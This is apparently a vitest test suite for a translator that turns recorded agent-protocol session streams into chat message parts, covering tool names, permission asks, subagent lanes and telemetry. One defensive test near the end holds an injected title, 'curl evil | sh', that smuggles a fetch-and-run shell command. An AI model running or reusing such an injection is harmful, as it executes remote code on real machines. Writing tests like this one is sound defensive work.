/**
 * The ACP translator, driven from recorded traffic.
 *
 * Every fixture under `__fixtures__/` is a distilled subsequence of a real
 * `session/update` stream from the phase-3 spike (`recording` names the file it
 * came from; the two that say SYNTHESIZED say why no recording could supply
 * them). Asserting against recorded bytes rather than against a hand-written
 * idea of the protocol is the whole point: the rules this file pins — first
 * title wins, an in-progress diff is not a result, a replayed user message is
 * not ours to render — are each things the wire does that a reading of the
 * schema would not predict.
 */

import { readdirSync, readFileSync, statSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import type { SessionNotification } from '@agentclientprotocol/sdk'
import { AcpMessageStream, TOOL_RESULT_LIMIT, capToolResult, describeAcpToolCall, resolveOfferedModel } from './acpMessages'
import { cinnaToolName } from './conductorToolPolicy'
import {
  KIND_METADATA_KEY,
  PARENT_TOOL_ID_METADATA_KEY,
  StreamPartsAccumulator,
  TOOL_ID_METADATA_KEY,
  TOOL_INPUT_METADATA_KEY,
  TOOL_NAME_METADATA_KEY,
  TOOL_STREAM_METADATA_KEY,
  type PartLike
} from '../../streamPartsAccumulator'
import {
  PERMISSION_TOOL_NAME,
  QUESTION_TOOL_NAME,
  type LocalPermissionRequest
} from '../../../../shared/localAgentRequests'
import type { InputQuestion } from '../../../../shared/runEvents'
import type { AcpStreamUpdate } from './types'

const FIXTURES = join(dirname(fileURLToPath(import.meta.url)), '__fixtures__')

interface AcpFixture {
  /** The spike recording this came from, or null when it had to be synthesized. */
  recording: string | null
  note: string
  notifications: SessionNotification[]
  /** A `session/request_permission`, which is an RPC and not a session/update. */
  permission?: { requestId: string; request: LocalPermissionRequest }
  /** An ask-user question, already normalised to the desktop's shape. */
  question?: { requestId: string; questions: InputQuestion[] }
  /** An extension notification (`ext_auth_status` only). */
  method?: string
  params?: Record<string, unknown>
}

function load(launcher: 'opencode' | 'claude' | 'codex', name: string): AcpFixture {
  return JSON.parse(readFileSync(join(FIXTURES, launcher, `${name}.json`), 'utf8')) as AcpFixture
}

/** Every fixture file on disk, so the hygiene test cannot be out of date. */
function fixtureFiles(): string[] {
  const out: string[] = []
  const walk = (dir: string): void => {
    for (const entry of readdirSync(dir)) {
      const path = join(dir, entry)
      if (statSync(path).isDirectory()) walk(path)
      else out.push(path)
    }
  }
  walk(FIXTURES)
  return out
}

/**
 * Fold a whole fixture in and keep the latest message for each id.
 *
 * The parts array a fold returns is the translator's own, so the map ends up
 * holding the final state of every message the stream produced — which is what
 * the accumulator would have ingested.
 */
function foldAll(
  stream: AcpMessageStream,
  fixture: AcpFixture
): { updates: AcpStreamUpdate[]; messages: Map<string, PartLike[]> } {
  const updates: AcpStreamUpdate[] = []
  const messages = new Map<string, PartLike[]>()
  for (const notification of fixture.notifications) {
    const update = stream.apply(notification)
    updates.push(update)
    if (update.message) messages.set(update.message.messageId, update.message.parts)
  }
  return { updates, messages }
}

const kindOf = (part: PartLike): unknown => part.metadata?.[KIND_METADATA_KEY]
const toolNameOf = (part: PartLike): unknown => part.metadata?.[TOOL_NAME_METADATA_KEY]
const toolIdOf = (part: PartLike): unknown => part.metadata?.[TOOL_ID_METADATA_KEY]

/** The one message a fixture produced, when it produced exactly one. */
function onlyMessage(messages: Map<string, PartLike[]>): PartLike[] {
  expect(messages.size).toBe(1)
  return [...messages.values()][0]
}

function chunk(messageId: string, text: string, kind = 'agent_message_chunk'): SessionNotification {
  return {
    sessionId: 'ses_test',
    update: { sessionUpdate: kind, messageId, content: { type: 'text', text } }
  } as unknown as SessionNotification
}

describe('fixture hygiene', () => {
  /**
   * The Claude adapter puts the user's account email in `_auth/status_update`
   * after every `session/new`, so it is in the raw recordings and one careless
   * copy would commit it. This test is the gate, and it scans the files on disk
   * rather than the ones the suite happens to load.
   */
  it('no fixture contains an email address', () => {
    const email = /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/
    const offenders = fixtureFiles().filter((path) => email.test(readFileSync(path, 'utf8')))
    expect(offenders).toEqual([])
  })

  it('every fixture names its recording or says why it has none', () => {
    for (const path of fixtureFiles()) {
      const fixture = JSON.parse(readFileSync(path, 'utf8')) as AcpFixture
      expect(fixture.note.length, path).toBeGreaterThan(0)
      if (fixture.recording === null) expect(fixture.note, path).toContain('SYNTHESIZED')
      else expect(fixture.recording, path).toMatch(/\.ndjson$/)
    }
  })
})

describe('OpenCode', () => {
  it('accumulates a plain turn into a thinking part and a text part', () => {
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    const { updates, messages } = foldAll(stream, load('opencode', 'text_turn'))
    const parts = onlyMessage(messages)
    expect(parts.map(kindOf)).toEqual(['thinking', 'text'])
    expect(parts[0].text).toBe('The user wants me to say hello in five words or fewer.')
    expect(parts[1].text).toBe('Hello there, how are you?')
    // The trailing usage_update is telemetry, never a message.
    expect(updates[updates.length - 1]).toEqual({ telemetry: { used: 8013, size: 200000, costUsd: 0 } })
  })

  it('hands back the cumulative text, never a delta', () => {
    const stream = new AcpMessageStream()
    const seen: string[] = []
    for (const text of ['one ', 'two ', 'three']) {
      const update = stream.apply(chunk('msg_1', text))
      seen.push(update.message?.parts[0].text ?? '')
    }
    // Each fold is a prefix of the next: what the accumulator slices off is
    // exactly the chunk that arrived, and nothing is repeated.
    expect(seen).toEqual(['one ', 'one two ', 'one two three'])
  })

  it('keeps the first title as the tool name and pairs the result to the call', () => {
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    const { messages } = foldAll(stream, load('opencode', 'tool_call_write'))
    const call = [...messages.values()].flat().find((p) => kindOf(p) === 'tool')
    expect(call).toBeDefined()
    // The completed update retitles the same call "private/tmp/…/notes.txt".
    expect(toolNameOf(call!)).toBe('write')
    expect(stream.toolName('call_h5kx0vip')).toBe('write')
    expect(call!.text).toBe('write: /private/tmp/spike-acp-opencode/agent1/notes.txt')
    expect(call!.metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual({
      content: 'hello from spike',
      filePath: '/private/tmp/spike-acp-opencode/agent1/notes.txt'
    })

    const result = [...messages.values()].flat().find((p) => kindOf(p) === 'tool_result')
    expect(result?.text).toBe('Wrote file successfully.')
    expect(toolIdOf(result!)).toBe('call_h5kx0vip')
    expect(result?.metadata?.[TOOL_STREAM_METADATA_KEY]).toBe('stdout')
  })

  it('starts a new text part after a tool call, inside one message', () => {
    // No recording forces this — both launchers open a new messageId after a
    // call — so it is pinned on a stream that does what the protocol allows.
    const stream = new AcpMessageStream()
    stream.apply(chunk('msg_1', 'before'))
    stream.apply({
      sessionId: 'ses_test',
      update: { sessionUpdate: 'tool_call', toolCallId: 'call_1', title: 'bash', kind: 'execute' }
    } as unknown as SessionNotification)
    const last = stream.apply(chunk('msg_1', 'after'))
    const parts = last.message?.parts ?? []
    expect(parts.map(kindOf)).toEqual(['text', 'tool', 'text'])
    expect(parts[0].text).toBe('before')
    expect(parts[2].text).toBe('after')
  })

  it('does not append the reply after an MCP call to the text before it', () => {
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    const { messages } = foldAll(stream, load('opencode', 'mcp_tool_call'))
    const before = messages.get('msg_08c78e051001btKZEADG79w2OI')
    const after = messages.get('msg_08c79732c001TZeHenuTZp3Eso')
    expect(before?.map(kindOf)).toEqual(['text', 'tool', 'tool_result'])
    expect(before?.[0].text).toBe('write`\n\n')
    expect(toolNameOf(before![1])).toBe('spike-mcp_secret_number')
    expect(before?.[2].text).toBe('The secret number for ada is 424242.')
    expect(after?.map(kindOf)).toEqual(['thinking', 'text'])
    expect(after?.[1].text).toBe('PINEAPPLE')
  })

  it('files a permission ask beside the call that raised it, and its decision beside the ask', () => {
    const fixture = load('opencode', 'permission_bash')
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    const { messages } = foldAll(stream, fixture)
    const { requestId, request } = fixture.permission!

    const asked = stream.askPermission(requestId, request)
    expect(asked.message?.parts).toBe(messages.get('anon:acp'))
    const ask = asked.message!.parts.find((p) => toolNameOf(p) === PERMISSION_TOOL_NAME)
    expect(ask?.text).toBe('Permission needed to run a command: echo spike > bash_out.txt')
    expect(toolIdOf(ask!)).toBe('per_1')
    expect(ask?.metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual(request)

    const settled = stream.settlePermission(requestId, 'Denied.')
    const decision = settled.message!.parts.find(
      (p) => kindOf(p) === 'tool_result' && toolIdOf(p) === 'per_1'
    )
    expect(decision?.text).toBe('Denied.')
    expect(decision?.metadata?.[TOOL_STREAM_METADATA_KEY]).toBe('stdout')

    // The engine's own record of the refusal is a failed tool, so stderr.
    const failure = settled.message!.parts.find(
      (p) => kindOf(p) === 'tool_result' && toolIdOf(p) === 'call_dv44kkcu'
    )
    expect(failure?.text).toBe('The user rejected permission to use this specific tool call.')
    expect(failure?.metadata?.[TOOL_STREAM_METADATA_KEY]).toBe('stderr')
  })

  it('writes a question under the reserved tool name and pairs the answer', () => {
    const fixture = load('opencode', 'question_tool')
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    foldAll(stream, fixture)
    const { requestId, questions } = fixture.question!

    const asked = stream.askQuestion(requestId, questions)
    const part = asked.message!.parts.find((p) => toolNameOf(p) === QUESTION_TOOL_NAME)
    expect(part?.text).toBe('Asked a question.')
    expect(toolIdOf(part!)).toBe('que_1')
    expect(part?.metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual({
      questions: [
        {
          question: 'Which color do you prefer?',
          header: 'Color Preference',
          multiSelect: false,
          options: [
            { label: 'Red', description: 'The color red' },
            { label: 'Blue', description: 'The color blue' }
          ]
        }
      ]
    })

    const settled = stream.settleQuestion(requestId, 'Answered: Red')
    const answer = settled.message!.parts.find(
      (p) => kindOf(p) === 'tool_result' && toolIdOf(p) === 'que_1'
    )
    expect(answer?.text).toBe('Answered: Red')
  })



  it('reports a mode change', () => {
    const { updates } = foldAll(new AcpMessageStream(), load('opencode', 'mode_update'))
    expect(updates[0]).toEqual({ modeId: 'folder-pineapple' })
  })

  it('renders a plan as a notice, once per distinct plan', () => {
    const fixture = load('opencode', 'plan')
    const stream = new AcpMessageStream()
    const { updates, messages } = foldAll(stream, fixture)
    const parts = onlyMessage(messages)
    expect(parts.map(kindOf)).toEqual(['notice', 'notice'])
    expect(parts[0].text).toBe(
      'Plan:\n- [x] Read the folder config\n- [~] Write notes.txt\n- [ ] Report back'
    )
    expect(parts[1].text).toContain('- [x] Write notes.txt')
    expect(updates).toHaveLength(2)
    // A plan restated without moving adds nothing: the accumulator can only
    // append, so a plan cannot rewrite its own block.
    expect(stream.apply(fixture.notifications[1])).toEqual({})
  })
})

describe('Claude', () => {
  it('accumulates the reply and ignores unsupported session metadata', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const { updates, messages } = foldAll(stream, load('claude', 'text_turn'))
    const parts = onlyMessage(messages)
    expect(parts.map(kindOf)).toEqual(['text'])
    expect(parts[0].text).toBe('Secret word: pomegranate; denied: step 4 (Edit).')
    expect(updates[updates.length - 1]).toEqual({})
  })

  it('prefers _meta.claudeCode.toolName over the title the adapter shows', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const { messages } = foldAll(stream, load('claude', 'tool_name_meta'))
    const parts = onlyMessage(messages)
    // The tool_call titles itself "Terminal"; only _meta says "Bash".
    expect(toolNameOf(parts[0])).toBe('Bash')
    expect(stream.toolName('toolu_01VgZ5tf7zvrjuBH7kcfTg7e')).toBe('Bash')
    expect(parts[0].text).toBe('Bash: echo hello > bash.txt')
    expect(parts[1].text).toBe('(Bash completed with no output)')
    expect(kindOf(parts[1])).toBe('tool_result')
  })

  it('keeps an MCP tool call under its full mcp__ name', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const { updates, messages } = foldAll(stream, load('claude', 'mcp_tool_call'))
    const parts = onlyMessage(messages)
    expect(toolNameOf(parts[0])).toBe('mcp__cinna-spike__spike_secret_word')
    expect(parts[1].text).toBe('pomegranate')
    // The bare `_meta.claudeCode.toolResponse` update carries no status and no
    // new input, so it changes nothing.
    expect(updates[2]).toEqual({})
  })

  it('does not read an in-progress diff as the tool output', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const { messages } = foldAll(stream, load('claude', 'tool_call_write'))
    const parts = onlyMessage(messages)
    expect(parts.map(kindOf)).toEqual(['tool', 'tool_result'])
    expect(parts[0].text).toBe('Write: /private/tmp/spike-acp-claude/s2/note.txt')
    expect(parts[1].text).toContain('File created successfully at:')
    expect(parts[1].text).not.toContain('[diff]')
  })

  it('files the ask beside its Edit call and the refusal beside both', () => {
    const fixture = load('claude', 'permission_edit')
    const stream = new AcpMessageStream({ launcher: 'claude' })
    foldAll(stream, fixture)
    const { requestId, request } = fixture.permission!

    const asked = stream.askPermission(requestId, request)
    const ask = asked.message!.parts.find((p) => toolNameOf(p) === PERMISSION_TOOL_NAME)
    expect(ask?.text).toBe(
      'Permission needed to edit a file: /private/tmp/spike-acp-claude/s2/note.txt'
    )
    // Beside the call, not in a message of its own.
    expect(asked.message!.parts[0].metadata?.[TOOL_ID_METADATA_KEY]).toBe(
      'toolu_01CZ5yipLiU8Ab27KimFxZdW'
    )
    const refusal = asked.message!.parts.find(
      (p) => kindOf(p) === 'tool_result' && toolIdOf(p) === 'toolu_01CZ5yipLiU8Ab27KimFxZdW'
    )
    expect(refusal?.text).toContain('User refused permission to run tool')
    expect(refusal?.metadata?.[TOOL_STREAM_METADATA_KEY]).toBe('stderr')
  })

  it('files a question beside the AskUserQuestion call it came from, and names the call', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    stream.apply(chunk('msg_1', 'Checking before I write.'))
    stream.apply({
      sessionId: 'ses_test',
      update: {
        sessionUpdate: 'tool_call',
        toolCallId: 'toolu_ask',
        title: 'AskUserQuestion',
        status: 'pending',
        _meta: { claudeCode: { toolName: 'AskUserQuestion' } }
      }
    } as unknown as SessionNotification)
    // The current message has moved on by the time the elicitation arrives.
    stream.apply(chunk('msg_2', 'Waiting.'))
    const questions: InputQuestion[] = [
      { question: 'Write it?', multiSelect: false, options: [{ label: 'Yes' }] }
    ]

    const asked = stream.askQuestion('que_acp_1', questions, 'toolu_ask')
    expect(asked.message?.messageId).toBe('msg_1')
    const part = asked.message!.parts.find((p) => toolNameOf(p) === QUESTION_TOOL_NAME)
    expect(part?.metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual({ questions, callId: 'toolu_ask' })
    // Its answer joins it there too.
    expect(stream.settleQuestion('que_acp_1', 'Answered: Yes.').message?.messageId).toBe('msg_1')
  })

  it('drops the replayed user message without letting it own the tool calls', () => {
    const { updates, messages } = foldAll(
      new AcpMessageStream({ launcher: 'claude' }),
      load('claude', 'session_load_replay')
    )
    // The user chunk is the desktop's own message coming back.
    expect(updates[0]).toEqual({})
    expect(messages.has('f22e4b6b-8604-4ed6-8298-0e877df0b9e6')).toBe(false)

    const replayed = messages.get('anon:acp') ?? []
    expect(replayed.map(toolNameOf).filter(Boolean)).toEqual([
      'ToolSearch',
      'mcp__cinna-spike__spike_secret_word',
      'Edit'
    ])
    // A replayed call carries its whole rawInput on the first `tool_call`,
    // where a live one fills it in over three updates.
    expect(replayed[0].metadata?.[TOOL_INPUT_METADATA_KEY]).toEqual({
      query: 'select:mcp__cinna-spike__spike_secret_word',
      max_results: 1
    })
    expect(replayed.filter((p) => kindOf(p) === 'tool_result')).toHaveLength(3)
    expect(messages.get('msg_011CevBwaeLrjUDYkhGk7Rws')?.[0].text).toBe(
      'Secret word: pomegranate; denied: step 4 (Edit).'
    )
  })

  it('reads the mode out of a config_option_update', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const { updates } = foldAll(stream, load('claude', 'mode_update'))
    expect(updates.map((u) => u.modeId)).toEqual(['auto', 'default'])
  })



  it('swallows an extension notification whole', () => {
    const fixture = load('claude', 'ext_auth_status')
    const stream = new AcpMessageStream({ launcher: 'claude' })
    expect(stream.applyExt(fixture.method!, fixture.params!)).toEqual({})
    expect(stream.applyExt('_session/goal', { goal: 'anything' })).toEqual({})
  })
})

describe('usage reports', () => {
  const usage = (update: Record<string, unknown>): SessionNotification =>
    ({ sessionId: 's1', update: { sessionUpdate: 'usage_update', ...update } }) as unknown as SessionNotification

  it('turns a usage_update into telemetry and never into a message', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    // Mid-turn: no cost.
    expect(stream.apply(usage({ used: 16_227, size: 200_000 }))).toEqual({ telemetry: { used: 16_227, size: 200_000 } })
    // The end of a model result, from a turn the agent started (followup_turn.json).
    expect(stream.apply(usage({
      used: 16_470, size: 200_000, cost: { amount: 0.0407752, currency: 'USD' },
      _meta: { '_claude/origin': { kind: 'task-notification' } }
    }))).toEqual({ telemetry: { used: 16_470, size: 200_000, costUsd: 0.0407752, origin: { kind: 'task-notification' } } })
    // A rate-limit event.
    const limit = { status: 'allowed_warning', resetsAt: 1_900_000_000 }
    expect(stream.apply(usage({ used: 1, size: 2, _meta: { '_claude/rateLimit': limit } }))).toEqual({ telemetry: { used: 1, size: 2, rateLimit: limit } })
    // Garbage in the numeric fields is dropped, not passed on.
    expect(stream.apply(usage({ used: 'lots', size: null, cost: { amount: 'free' } }))).toEqual({ telemetry: {} })
  })

  it('reads the session’s model option out of a config_option_update, beside the mode', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const update = stream.apply({
      sessionId: 's1',
      update: {
        sessionUpdate: 'config_option_update',
        configOptions: [
          { id: 'mode', category: 'mode', type: 'select', currentValue: 'auto', options: [] },
          { id: 'model', category: 'model', type: 'select', currentValue: 'opus', options: [] },
          { id: 'effort', category: 'thought_level', type: 'select', currentValue: 'high', options: [] }
        ]
      }
    } as unknown as SessionNotification)
    expect(update).toEqual({ modeId: 'auto', selectedModel: 'opus' })
  })
})

describe('subagent lanes', () => {
  const PARENT = 'toolu_agent'
  const lane = { claudeCode: { parentToolUseId: PARENT } }
  const agentCall = {
    sessionId: 'ses_parent',
    update: {
      sessionUpdate: 'tool_call',
      toolCallId: PARENT,
      title: 'Task',
      status: 'pending',
      rawInput: { description: 'check pg', prompt: 'Confirm pg' },
      _meta: { claudeCode: { toolName: 'Agent' } }
    }
  } as unknown as SessionNotification
  const childTool = (status?: string, output?: string): SessionNotification =>
    ({
      sessionId: 'ses_child',
      update: {
        sessionUpdate: status ? 'tool_call_update' : 'tool_call',
        toolCallId: 'toolu_child_bash',
        ...(status ? { status } : { title: 'Terminal', rawInput: { command: 'psql -c 1' } }),
        ...(output ? { rawOutput: output } : {}),
        _meta: { claudeCode: { toolName: 'Bash', ...lane.claudeCode } }
      }
    }) as unknown as SessionNotification
  const childChunk = (text: string): SessionNotification =>
    ({
      sessionId: 'ses_child',
      update: {
        sessionUpdate: 'agent_message_chunk',
        messageId: 'msg_child',
        content: { type: 'text', text },
        _meta: lane
      }
    }) as unknown as SessionNotification
  const laneOf = (part: PartLike): unknown => part.metadata?.[PARENT_TOOL_ID_METADATA_KEY]

  /** The real session: the parent's sentence, cut mid-word by its subagent's work. */
  const interleaved = (): SessionNotification[] => [
    chunk('msg_parent', 'Launching a check.'),
    agentCall,
    chunk('msg_parent2', '…(the Florian Rockenhä'),
    childTool(),
    chunk('msg_parent2', 'user /'),
    childTool('completed', 'ok'),
    childChunk('Confirmed "pg".'),
    chunk('msg_parent2', ' Traffective metric)…')
  ]

  it('keeps the parent’s text one part while child frames interleave', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const messages = new Map<string, PartLike[]>()
    for (const n of interleaved()) {
      const update = stream.apply(n)
      if (update.message) messages.set(update.message.messageId, update.message.parts)
    }
    const parent = messages.get('msg_parent2')!
    const own = parent.filter((p) => kindOf(p) === 'text' && !laneOf(p))
    expect(own.map((p) => p.text)).toEqual(['…(the Florian Rockenhäuser / Traffective metric)…'])
    // Every child part carries the lane, and none of the parent's does.
    const child = [...messages.values()].flat().filter((p) => laneOf(p) === PARENT)
    expect(child.map((p) => kindOf(p))).toEqual(['tool', 'tool_result', 'text'])
    expect(child.map((p) => toolIdOf(p))).toEqual(['toolu_child_bash', 'toolu_child_bash', undefined])
    // Filed under the message that owns the Agent call, not the child's own id.
    expect(messages.has('msg_child')).toBe(false)
    expect(messages.get('msg_parent')!.filter((p) => laneOf(p) === PARENT)).toHaveLength(3)
  })

  it('still starts a new part after a tool call of the parent’s own', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    stream.apply(chunk('msg_p', 'Before'))
    stream.apply(childTool())
    stream.apply(chunk('msg_p', ' still before.'))
    stream.apply({
      sessionId: 'ses_parent',
      update: { sessionUpdate: 'tool_call', toolCallId: 'toolu_own', title: 'Read', _meta: { claudeCode: { toolName: 'Read' } } }
    } as unknown as SessionNotification)
    const parts = stream.apply(chunk('msg_p', 'After.')).message!.parts
    expect(parts.filter((p) => kindOf(p) === 'text' && !laneOf(p)).map((p) => p.text)).toEqual([
      'Before still before.',
      'After.'
    ])
  })

  it('splits the child’s own text around the child’s tool call', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    stream.apply(agentCall)
    stream.apply(childChunk('Looking.'))
    stream.apply(childTool())
    const parts = stream.apply(childChunk('Found it.')).message!.parts
    expect(parts.filter((p) => laneOf(p) && kindOf(p) === 'text').map((p) => p.text)).toEqual(['Looking.', 'Found it.'])
  })

  it('files a subagent tool’s permission ask, question and decisions in its lane, so the parent’s text stays whole', () => {
    // Mutation: drop the lane from `askPermission`/`settle` → the parent's sentence splits around the ask.
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const acc = new StreamPartsAccumulator()
    const port = { postMessage: (): void => {} }
    const feed = (update: { message?: { messageId: string; parts: PartLike[] } }): void => { if (update.message) acc.ingestMessage(update.message, port) }
    feed(stream.apply(agentCall))
    feed(stream.apply(chunk('msg_p', 'Waiting on')))
    feed(stream.apply(childTool()))
    feed(stream.askPermission('per_child', { action: 'bash', resources: ['psql -c 1'], savable: [], callId: 'toolu_child_bash' }))
    feed(stream.askQuestion('que_child', [{ question: 'Which db?', header: 'db', options: [], multiSelect: false }], 'toolu_child_bash'))
    feed(stream.settlePermission('per_child', 'Allowed once.'))
    feed(stream.settleQuestion('que_child', 'Answered: pg'))
    feed(stream.apply(chunk('msg_p', ' the subagent.')))
    const parts = acc.snapshotParts()
    expect(parts.filter((p) => p.kind === 'text' && !p.parentToolId).map((p) => p.text)).toEqual(['Waiting on the subagent.'])
    expect(parts.filter((p) => p.toolId === 'per_child' || p.toolId === 'que_child').map((p) => [p.kind, p.toolId, p.parentToolId])).toEqual([
      ['tool', 'per_child', PARENT],
      ['tool', 'que_child', PARENT],
      ['tool_result', 'per_child', PARENT],
      ['tool_result', 'que_child', PARENT]
    ])
  })

  it('leaves the parent’s own asks in the main lane', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    stream.apply(agentCall)
    const asked = stream.askPermission('per_own', { action: 'bash', resources: ['ls'], savable: [], callId: PARENT })
    const settled = stream.settlePermission('per_own', 'Allowed once.')
    for (const update of [asked, settled]) {
      expect(update.message!.parts.filter((p) => toolIdOf(p) === 'per_own').every((p) => !laneOf(p))).toBe(true)
    }
  })

  it('persists one parent paragraph and an answer without the child’s words', () => {
    const stream = new AcpMessageStream({ launcher: 'claude' })
    const acc = new StreamPartsAccumulator()
    const deltas: { kind: string; text: string; parentToolId?: string }[] = []
    const port = { postMessage: (d: { kind: string; text: string; parentToolId?: string }): void => { deltas.push(d) } }
    for (const n of interleaved()) {
      const update = stream.apply(n)
      if (update.message) acc.ingestMessage(update.message, port)
    }
    const parts = acc.snapshotParts()
    expect(parts.filter((p) => p.kind === 'text' && !p.parentToolId).map((p) => p.text)).toEqual([
      'Launching a check.',
      '…(the Florian Rockenhäuser / Traffective metric)…'
    ])
    expect(parts.filter((p) => p.parentToolId === PARENT).map((p) => p.kind)).toEqual(['tool', 'tool_result', 'text'])
    expect(acc.answerText()).toBe('Launching a check.…(the Florian Rockenhäuser / Traffective metric)…')
    expect(deltas.filter((d) => d.parentToolId === PARENT).map((d) => d.kind)).toEqual(['tool', 'tool_result', 'text'])
  })
})

describe('robustness', () => {
  it('returns an empty update for anything malformed or unknown', () => {
    const stream = new AcpMessageStream()
    const junk: unknown[] = [
      undefined,
      null,
      {},
      { sessionId: 'x' },
      { sessionId: 'x', update: null },
      { sessionId: 'x', update: 'nonsense' },
      { sessionId: 'x', update: { sessionUpdate: 'a_kind_from_2027', payload: 1 } },
      { sessionId: 'x', update: { sessionUpdate: 'tool_call' } },
      { sessionId: 'x', update: { sessionUpdate: 'tool_call', toolCallId: 42 } },
      { sessionId: 'x', update: { sessionUpdate: 'plan', entries: 'nope' } },
      { sessionId: 'x', update: { sessionUpdate: 'available_commands_update' } },
      { sessionId: 'x', update: { sessionUpdate: 'session_info_update', title: null } },
      {
        sessionId: 'x',
        update: { sessionUpdate: 'config_option_update', configOptions: [{ id: 'model' }] }
      },
      {
        sessionId: 'x',
        update: { sessionUpdate: 'agent_message_chunk', content: { type: 'image', data: 'x' } }
      }
    ]
    for (const item of junk) {
      expect(stream.apply(item as SessionNotification), JSON.stringify(item)).toEqual({})
    }
  })

  it('ignores a decision for a request it never wrote', () => {
    const stream = new AcpMessageStream()
    expect(stream.settlePermission('per_missing', 'Allowed.')).toEqual({})
    expect(stream.settleQuestion('que_missing', 'Answered: yes')).toEqual({})
    expect(stream.askQuestion('que_empty', [])).toEqual({})
  })

  it('gives every note its own slot', () => {
    const stream = new AcpMessageStream()
    stream.apply(chunk('msg_1', 'hi'))
    stream.note('Starting up the agent environment…')
    const last = stream.note('Still working.')
    const notices = (last.message?.parts ?? []).filter((p) => kindOf(p) === 'notice')
    expect(notices.map((p) => p.text)).toEqual([
      'Starting up the agent environment…',
      'Still working.'
    ])
    expect(stream.note('')).toEqual({})
  })
})

describe('which Cinna tool a call is for (cinnaTool)', () => {
  const call = (launcher: 'codex' | 'claude' | 'opencode' | 'antigravity' | 'custom', update: Record<string, unknown>): AcpMessageStream => {
    const stream = new AcpMessageStream({ launcher })
    stream.apply({ sessionId: 's', update: { sessionUpdate: 'tool_call', toolCallId: 'c', status: 'pending', ...update } } as unknown as SessionNotification)
    return stream
  }

  it('reads Codex from the server/tool pair the adapter puts in rawInput', () => {
    expect(call('codex', { title: 'mcp.cinna.probe', rawInput: { server: 'cinna', tool: 'probe', arguments: {} } }).cinnaTool('c')).toBe('probe')
    // A shell call titled like one, and another server's call, are not.
    expect(call('codex', { title: 'mcp.cinna.probe', kind: 'execute', rawInput: { command: ['mcp.cinna.probe'] } }).cinnaTool('c')).toBeNull()
    expect(call('codex', { title: 'mcp.github.search', rawInput: { server: 'github', tool: 'search', arguments: { server: 'cinna' } } }).cinnaTool('c')).toBeNull()
  })

  it('reads a rawInput filled in by a later update', () => {
    const stream = call('codex', { title: 'mcp.cinna.probe' })
    expect(stream.cinnaTool('c')).toBeNull()
    stream.apply({ sessionId: 's', update: { sessionUpdate: 'tool_call_update', toolCallId: 'c', rawInput: { server: 'cinna', tool: 'probe' } } } as unknown as SessionNotification)
    expect(stream.cinnaTool('c')).toBe('probe')
  })

  it('reads Claude from the adapter’s tool name, never from the model’s input', () => {
    expect(call('claude', { title: 'probe', _meta: { claudeCode: { toolName: 'mcp__cinna__probe' } } }).cinnaTool('c')).toBe('probe')
    expect(call('claude', { title: 'mcp__cinna__probe', _meta: { claudeCode: { toolName: 'mcp__github__search' } }, rawInput: { server: 'cinna', tool: 'probe' } }).cinnaTool('c')).toBeNull()
  })

  it('reads Antigravity from the bare name its MCP call’s first title carries, on an `other` call only', () => {
    // Real 1.3.0 shape: `Running <tool>`, kind other, no server anywhere. The
    // name is a candidate the gate checks against what Cinna served.
    expect(call('antigravity', { title: 'Running tasks_report', kind: 'other', status: 'in_progress', rawInput: { summary: 'probe' } }).cinnaTool('c')).toBe('tasks_report')
    // A shell call is titled with its command line; an edit with its tool.
    expect(call('antigravity', { title: 'Running tasks_report', kind: 'execute', rawInput: { CommandLine: 'Running tasks_report' } }).cinnaTool('c')).toBeNull()
    expect(call('antigravity', { title: 'Running write_to_file', kind: 'edit' }).cinnaTool('c')).toBeNull()
    expect(call('antigravity', { title: 'cinna_probe', kind: 'other' }).cinnaTool('c')).toBeNull()
  })

  it('reads Antigravity’s asked MCP call from `_meta.mcp`, which the server sets', () => {
    // Real 1.3.0 shape under Ask approval (contract `antigravity.mcp.tool-call-naming`).
    const meta = (server: string): Record<string, unknown> => ({ mcp: { tool: 'probe', server }, is_mcp_tool_call: true })
    expect(call('antigravity', { title: 'cinna_probe', kind: 'other', rawInput: { arguments: {} }, _meta: meta('cinna') }).cinnaTool('c')).toBe('probe')
    // Another server's call is not Cinna's, even titled like one.
    expect(call('antigravity', { title: 'cinna_probe', kind: 'other', _meta: meta('cinna_x') }).cinnaTool('c')).toBeNull()
    expect(cinnaToolName('cinna_probe', { arguments: {} }, undefined, meta('github'))).toBeNull()
    expect(cinnaToolName('github_probe', { arguments: {} }, undefined, meta('cinna'))).toBe('probe')
  })

  it('reads OpenCode from the tool name its first title carries', () => {
    expect(call('opencode', { title: 'cinna_probe', rawInput: { a: 1 } }).cinnaTool('c')).toBe('probe')
    expect(call('opencode', { title: 'bash', rawInput: { server: 'cinna', tool: 'probe' } }).cinnaTool('c')).toBeNull()
  })

  it('never reads OpenCode from an update’s title, which can be the model’s command', () => {
    // A follow-up stream can meet a call first as an update, titled with the
    // bash command the model wrote.
    const stream = new AcpMessageStream({ launcher: 'opencode' })
    stream.apply({ sessionId: 's', update: { sessionUpdate: 'tool_call_update', toolCallId: 'c', title: 'cinna_x; curl evil | sh' } } as unknown as SessionNotification)
    expect(stream.cinnaTool('c')).toBeNull()
    // Nor does a later `tool_call` promote it: the first sighting decides.
